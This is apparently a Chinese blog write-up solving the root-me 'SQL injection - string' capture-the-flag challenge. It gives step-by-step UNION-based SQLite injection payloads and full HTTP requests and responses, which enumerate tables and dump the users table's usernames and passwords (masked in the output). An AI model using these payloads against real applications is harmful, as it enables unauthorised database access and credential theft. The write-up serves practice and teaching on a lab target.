---
layout: post
title: root-me SQL injection - string题解
category: 网络安全
keywords: 安全,SQL注入,2019
---

## 0x01 定位注入点

该CMS有几个功能，其中一个功能是搜索功能，简单尝试后，发现该模块存在SQL注入点.<br>
因为当我搜索xxx' or '1时，可以把所有文章搜索出来<br><br>
Request 如下
```
POST /web-serveur/ch19/?action=recherche HTTP/1.1
Host: challenge01.root-me.org
Content-Length: 20
Cache-Control: max-age=0
Origin: http://challenge01.root-me.org
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Referer: http://challenge01.root-me.org/web-serveur/ch19/?action=recherche
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,zh-TW;q=0.6
Cookie: uid=wKgbZF0TcGbCZV0pD8DAAg==
Connection: close

recherche=xxx' or '1
```
Response如下
```
<html>
  <body>
    <link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' />
    <iframe id='iframe' src='https://www.root-me.org/?page=externe_header'></iframe>
    <h1>CMS v 0.02</h1>
    <div style="text-align: right;">
      <a href="./">Home</a>
      &nbsp;|&nbsp;
      <a href="./?action=recherche">Search</a>
      &nbsp;|&nbsp;
      <a href="./?action=login">Login</a>
      <br/>
    </div>
    <hr/>
    <h3>Recherche</h3>
    <form action="./?action=recherche" method="post">
      <input type="text" name="recherche" />
      &nbsp;
      <input type="submit" value="chercher" />
      <br/>
      <br/>
    </form>
    <i>5 result(s) for "xxx' or '1"</i>
    <br/>
    <br/>
    <b>Système de news / News system</b>
    &nbsp;(La mise en place du système de news est désormais effective / News system activated.)
    <br/>
    <b>Publication du site / Site publication</b>
    &nbsp;(Le site est désormais ouvert à toutes et à tous / Site is open)
    <br/>
    <b>Bienvenu / Welcome</b>
    &nbsp;(Bienvenu à tous / Welcome all !)
    <br/>
    <b>Correction faille / Vulnerability</b>
    &nbsp;(Un petit malin a trouvé un trou dans notre nouveau site. Trou bouché ! / Vulnerability fix)
    <br/>
    <b>Système de recherche / Search Engine</b>
    &nbsp;(Un système de recherche nous permet désormais de rechercher une news / News : search engine :))
    <br/>
  </body>
</html>
```

## 0x02 暴破列数，以便使用union select
```
recherche=xxx' union select 1 --

recherche=xxx' union select 1,2 --

recherche=xxx' union select 1,2,3 --
```
发现recherche=xxx' union select 1,2 --结果没报错，说明前一个select共有两列

## 0x03 查表名
Request 如下
```
recherche=xxx' union SELECT tbl_name,tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' --
```
Response如下
```
<html>
  <body>
    <link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' />
    <iframe id='iframe' src='https://www.root-me.org/?page=externe_header'></iframe>
    <h1>CMS v 0.02</h1>
    <div style="text-align: right;">
      <a href="./">Home</a>
      &nbsp;|&nbsp;
      <a href="./?action=recherche">Search</a>
      &nbsp;|&nbsp;
      <a href="./?action=login">Login</a>
      <br/>
    </div>
    <hr/>
    <h3>Recherche</h3>
    <form action="./?action=recherche" method="post">
      <input type="text" name="recherche" />
      &nbsp;
      <input type="submit" value="chercher" />
      <br/>
      <br/>
    </form>
    <i>2 result(s) for "xxx' union SELECT tbl_name,tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' --asfd"</i>
    <br/>
    <br/>
    <b>news</b>
    &nbsp;(news)
    <br/>
    <b>users</b>
    &nbsp;(users)
    <br/>
  </body>
</html>
```
说明有两个表，一个是news，一个是users

## 0x03 查列定义
Request 如下
```
recherche=xxx' union SELECT sql,sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' AND name ='users' --
```
Response如下
```
<html>
  <body>
    <link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' />
    <iframe id='iframe' src='https://www.root-me.org/?page=externe_header'></iframe>
    <h1>CMS v 0.02</h1>
    <div style="text-align: right;">
      <a href="./">Home</a>
      &nbsp;|&nbsp;
      <a href="./?action=recherche">Search</a>
      &nbsp;|&nbsp;
      <a href="./?action=login">Login</a>
      <br/>
    </div>
    <hr/>
    <h3>Recherche</h3>
    <form action="./?action=recherche" method="post">
      <input type="text" name="recherche" />
      &nbsp;
      <input type="submit" value="chercher" />
      <br/>
      <br/>
    </form>
    <i>1 result(s) for "xxx' union SELECT sql,sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' AND name ='users' --asfd"</i>
    <br/>
    <br/>
    <b>CREATE TABLE users(username TEXT, password TEXT, Year INTEGER)</b>
    &nbsp;(CREATE TABLE users(username TEXT, password TEXT, Year INTEGER))
    <br/>
  </body>
</html>
```
说明users表有三列，分别是username TEXT, password TEXT, Year INTEGER

## 0x04 拖数据
Request 如下
```
recherche=xxx' union SELECT username,password FROM 'users' --
```
Response如下
```
<html>
  <body>
    <link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' />
    <iframe id='iframe' src='https://www.root-me.org/?page=externe_header'></iframe>
    <h1>CMS v 0.02</h1>
    <div style="text-align: right;">
      <a href="./">Home</a>
      &nbsp;|&nbsp;
      <a href="./?action=recherche">Search</a>
      &nbsp;|&nbsp;
      <a href="./?action=login">Login</a>
      <br/>
    </div>
    <hr/>
    <h3>Recherche</h3>
    <form action="./?action=recherche" method="post">
      <input type="text" name="recherche" />
      &nbsp;
      <input type="submit" value="chercher" />
      <br/>
      <br/>
    </form>
    <i>3 result(s) for "xxx' union SELECT username,password FROM 'users' --asfd"</i>
    <br/>
    <br/>
    <b>admin</b>
    &nbsp;(******)
    <br/>
    <b>user1</b>
    &nbsp;(******)
    <br/>
    <b>user2</b>
    &nbsp;(******)
    <br/>
  </body>
</html>
```

## 0x05 引用
[01 SQLite Injection.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md)

[02 sql注入绕过union select过滤](https://www.cnblogs.com/xishaonian/p/6274586.html)

[03 SQL Injection Cheat Sheet](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/)